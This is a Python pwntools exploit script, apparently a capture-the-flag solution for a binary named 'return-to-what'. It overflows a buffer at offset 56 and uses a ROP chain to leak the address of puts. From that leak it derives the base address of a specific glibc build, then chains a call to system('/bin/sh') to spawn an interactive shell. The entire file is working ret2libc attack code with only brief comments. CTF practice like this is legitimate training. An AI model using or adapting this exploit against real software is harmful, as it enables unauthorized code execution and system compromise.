#!/usr/bin/env python
from pwn import *
from pprint import pprint

context.arch = 'amd64'

offset = 56

elf = ELF("./return-to-what")
p = elf.process()

rop = ROP(elf)
rop.call(elf.symbols["puts"],[elf.got['puts']])
rop.call(elf.symbols["vuln"])

print(p.recvuntil("\n"))
print(p.recvuntil("\n"))

payload = [
	b"A" * offset,
	rop.chain()
]

payload = b"".join(payload)

p.sendline(payload)

puts = u64(p.recvuntil("\n").rstrip().ljust(8, b'\x00'))
log.info(f"puts found at {hex(puts)}")

# p.interactive()


# Get the above puts address and check in libc database for puts with the hex value
# We can download the glibc from libc database


libc = ELF("libc6_2.27-3ubuntu1_amd64.so")
libc.address = puts - libc.symbols["puts"] # Must have 3 trailing zeros

rop = ROP(libc)
rop.call("puts", [next(libc.search(b"/bin/sh\x00"))])
rop.call("system", [next(libc.search(b"/bin/sh\x00"))])
rop.call("exit")

payload = [
	b"A" * offset,
	rop.chain()
]

payload = b"".join(payload)

p.sendline(payload)

p.interactive()
